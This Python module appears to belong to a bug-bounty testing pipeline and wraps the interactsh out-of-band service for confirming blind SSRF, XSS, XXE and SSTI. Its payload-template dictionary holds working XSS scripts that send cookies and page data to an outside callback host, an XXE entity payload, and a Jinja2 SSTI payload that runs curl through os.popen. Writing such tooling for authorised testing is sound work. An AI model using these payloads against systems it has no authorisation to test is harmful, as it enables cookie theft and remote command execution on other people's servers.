"""
Interactsh OAST (Out-of-Band Application Security Testing) tool wrapper.

Provides a unique OAST URL for confirming blind SSRF, stored XSS, XXE,
SSTI, and any other vulnerability that requires an out-of-band callback
to prove exploitation.

Architecture:
  - InteractshSession: manages a single OAST session (register → poll → stop)
  - InteractshWrapper: ToolWrapper subclass for pipeline integration

Requires: pip install cryptography

Public interactsh servers (tried in order):
  oast.fun, oast.pro, oast.live
"""

from __future__ import annotations

import base64
import json
import logging
import secrets
import shutil
import threading
import time
import urllib.request
import urllib.error
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

from tools.base import ToolWrapper

log = logging.getLogger(__name__)

_OAST_SERVERS = [
    "https://oast.fun",
    "https://oast.pro",
    "https://oast.live",
]

# Payload templates — {oast_url} is replaced with the actual OAST hostname
_PAYLOAD_TEMPLATES: dict[str, str] = {
    # XSS: cookie + domain exfiltration
    "xss": (
        '<script>fetch("https://{oast_url}/?c="'
        '+encodeURIComponent(document.cookie)'
        '+"&d="+document.domain)</script>'
    ),
    # XSS: page title + URL (when cookies are HttpOnly)
    "xss_dom": (
        '<script>fetch("https://{oast_url}/?h="'
        '+encodeURIComponent(document.title)'
        '+"&u="+encodeURIComponent(location.href))</script>'
    ),
    # XSS via javascript: URI (for href injection like MPEL venWebUrl)
    "xss_href": (
        "javascript:fetch('https://{oast_url}/?c='"
        "+encodeURIComponent(document.cookie)"
        "+'&d='+document.domain)"
    ),
    # SSRF: plain URL for server-side fetch detection
    "ssrf": "https://{oast_url}/ssrf-probe",
    # SSRF: for registration/form fields that need a resolvable URL
    "ssrf_url": "https://{oast_url}",
    # XXE: external entity injection
    "xxe": (
        '<?xml version="1.0"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://{oast_url}/xxe">]>'
        '<foo>&xxe;</foo>'
    ),
    # SSTI: Python/Jinja2 template injection
    "ssti": (
        "{{request.application.__globals__.__builtins__.__import__"
        "('os').popen('curl https://{oast_url}/ssti').read()}}"
    ),
    # Generic OOB
    "oob": "https://{oast_url}/oob",
}


# ---------------------------------------------------------------------------
# Session
# ---------------------------------------------------------------------------

class InteractshSession:
    """
    Manages a single interactsh OAST session.

    Usage:
        session = InteractshSession()
        oast_url = session.start()          # e.g. abc123.oast.fun
        payload  = session.get_payload("ssrf")
        # ... send payload to target ...
        callbacks = session.poll_callbacks(timeout=45)
        session.stop()
    """

    def __init__(self) -> None:
        self._server: str = ""
        self._correlation_id: str = ""
        self._secret_key: str = ""
        self._private_key = None
        self._aes_key: bytes = b""
        self.oast_url: str = ""
        self.oast_host: str = ""         # just the hostname, no scheme
        self._callbacks: list[dict] = []
        self._lock = threading.Lock()
        self._running = False
        self._poll_thread: Optional[threading.Thread] = None

    def start(self) -> str:
        """
        Register with an interactsh server.
        Returns the OAST hostname (e.g. abc123.oast.fun).
        Raises RuntimeError if the cryptography package is missing or all
        servers are unreachable.
        """
        try:
            from cryptography.hazmat.primitives.asymmetric import rsa
            from cryptography.hazmat.primitives import serialization
        except ImportError:
            raise RuntimeError(
                "The 'cryptography' package is required. Run: pip install cryptography"
            )

        # Generate RSA-2048 key pair
        self._private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
        )
        pub_der = self._private_key.public_key().public_bytes(
            encoding=serialization.Encoding.DER,
            format=serialization.PublicFormat.SubjectPublicKeyInfo,
        )
        pub_b64 = base64.b64encode(pub_der).decode()

        self._correlation_id = secrets.token_hex(10)   # 20 hex chars
        self._secret_key = secrets.token_hex(16)        # 32 hex chars

        body = json.dumps({
            "public-key": pub_b64,
            "secret-key": self._secret_key,
            "correlation-id": self._correlation_id,
        }).encode()

        for server in _OAST_SERVERS:
            try:
                req = urllib.request.Request(
                    f"{server}/register",
                    data=body,
                    headers={"Content-Type": "application/json"},
                    method="POST",
                )
                with urllib.request.urlopen(req, timeout=15) as resp:
                    data = json.loads(resp.read())
                    if data.get("message", "").lower() == "registration successful" or "correlationId" in data:
                        self._server = server
                        server_host = server.replace("https://", "").replace("http://", "")
                        self.oast_host = f"{self._correlation_id}.{server_host}"
                        self.oast_url = f"https://{self.oast_host}"
                        self._running = True
                        self._poll_thread = threading.Thread(
                            target=self._background_poll, daemon=True
                        )
                        self._poll_thread.start()
                        log.info("[interactsh] Session started: %s", self.oast_host)
                        return self.oast_host
            except Exception as exc:
                log.debug("[interactsh] Server %s failed: %s", server, exc)
                continue

        raise RuntimeError("Failed to register with any interactsh server. Check network connectivity.")

    def get_payload(self, payload_type: str = "ssrf") -> str:
        """Return a ready-to-use payload with the OAST URL embedded."""
        if not self.oast_host:
            raise RuntimeError("Session not started. Call start() first.")
        template = _PAYLOAD_TEMPLATES.get(payload_type, _PAYLOAD_TEMPLATES["oob"])
        return template.replace("{oast_url}", self.oast_host)

    def poll_callbacks(self, timeout: int = 45) -> list[dict]:
        """
        Block until at least one callback arrives or timeout expires.
        Returns all callbacks received so far.
        """
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            with self._lock:
                if self._callbacks:
                    return list(self._callbacks)
            time.sleep(1)
        with self._lock:
            return list(self._callbacks)

    def has_callback(self) -> bool:
        with self._lock:
            return len(self._callbacks) > 0

    def get_callbacks(self) -> list[dict]:
        with self._lock:
            return list(self._callbacks)

    def stop(self) -> None:
        self._running = False
        if self._poll_thread:
            self._poll_thread.join(timeout=5)

    # ------------------------------------------------------------------
    # Internal polling loop
    # ------------------------------------------------------------------

    def _background_poll(self) -> None:
        while self._running:
            try:
                url = (
                    f"{self._server}/poll"
                    f"?id={self._correlation_id}"
                    f"&secret={self._secret_key}"
                )
                req = urllib.request.Request(url, headers={"Content-Type": "application/json"})
                with urllib.request.urlopen(req, timeout=10) as resp:
                    data = json.loads(resp.read())
                    interactions = data.get("data") or []
                    aes_key_enc = data.get("aes_key", "")

                    if interactions and aes_key_enc:
                        aes_key = self._decrypt_aes_key(aes_key_enc)
                        if aes_key:
                            for item in interactions:
                                decoded = self._decrypt_interaction(item, aes_key)
                                if decoded:
                                    with self._lock:
                                        self._callbacks.append(decoded)
                                    log.info(
                                        "[interactsh] CALLBACK RECEIVED — protocol=%s from=%s",
                                        decoded.get("protocol", "?"),
                                        decoded.get("remote-address", "?"),
                                    )
            except Exception as exc:
                log.debug("[interactsh] Poll error: %s", exc)
            time.sleep(3)

    def _decrypt_aes_key(self, encrypted_b64: str) -> Optional[bytes]:
        try:
            from cryptography.hazmat.primitives.asymmetric import padding
            from cryptography.hazmat.primitives import hashes
            encrypted = base64.b64decode(encrypted_b64)
            aes_key = self._private_key.decrypt(
                encrypted,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None,
                ),
            )
            return aes_key
        except Exception as exc:
            log.debug("[interactsh] AES key decrypt failed: %s", exc)
            return None

    def _decrypt_interaction(self, encrypted_b64: str, aes_key: bytes) -> Optional[dict]:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            data = base64.b64decode(encrypted_b64)
            iv = data[:16]
            ciphertext = data[16:]
            cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv))
            dec = cipher.decryptor()
            plaintext = dec.update(ciphertext) + dec.finalize()
            return json.loads(plaintext.decode("utf-8", errors="replace"))
        except Exception as exc:
            log.debug("[interactsh] Interaction decrypt failed: %s", exc)
            return None


# ---------------------------------------------------------------------------
# ToolWrapper shim — lets the pipeline instantiate InteractshWrapper like
# any other tool. Actual OAST work is done via new_session().
# ---------------------------------------------------------------------------

class InteractshWrapper(ToolWrapper):
    """
    Pipeline-compatible wrapper for interactsh OAST sessions.

    Unlike other wrappers, this one does not call a CLI binary directly.
    Instead it exposes new_session() which returns an InteractshSession.

    available() returns True if the cryptography package is installed
    (pure-Python HTTP implementation) OR if interactsh-client binary exists.
    """

    name = "interactsh-client"
    version_flag = "-version"

    def available(self) -> bool:
        if shutil.which(self.name):
            return True
        try:
            import cryptography  # noqa: F401
            return True
        except ImportError:
            return False

    def tool_version(self) -> str:
        if shutil.which(self.name):
            return super().tool_version()
        try:
            import cryptography
            return f"python-http/{cryptography.__version__}"
        except Exception:
            return "python-http/unknown"

    def new_session(self) -> InteractshSession:
        """Create and return a new OAST session. Caller must call session.start()."""
        return InteractshSession()

    def run(
        self,
        target: str,
        depth: str,
        run_id: str,
        raw_output_dir: Path,
        program: dict,
        **kwargs,
    ) -> dict:
        # Interactsh is a session-based tool, not a single-run tool.
        # This stub satisfies the ToolWrapper contract.
        raise NotImplementedError(
            "InteractshWrapper does not support run(). Use new_session() instead."
        )


# ---------------------------------------------------------------------------
# Convenience: format a callback for inclusion in a finding's evidence field
# ---------------------------------------------------------------------------

def format_callback_evidence(callbacks: list[dict], oast_host: str) -> str:
    """
    Format interactsh callbacks into a human-readable evidence string
    for inclusion in findings.json and bug bounty reports.
    """
    if not callbacks:
        return f"No callbacks received on {oast_host}"

    lines = [f"OAST callbacks received on {oast_host} ({len(callbacks)} interaction(s)):"]
    for i, cb in enumerate(callbacks, 1):
        proto = cb.get("protocol", "unknown").upper()
        src   = cb.get("remote-address", "unknown")
        ts    = cb.get("timestamp", "")
        uid   = cb.get("unique-id", "")
        lines.append(f"  [{i}] {proto} from {src} at {ts} (id={uid})")
        if proto == "HTTP" and cb.get("raw-request"):
            req_snippet = cb["raw-request"][:300].replace("\n", " | ")
            lines.append(f"      Request: {req_snippet}")
    return "\n".join(lines)
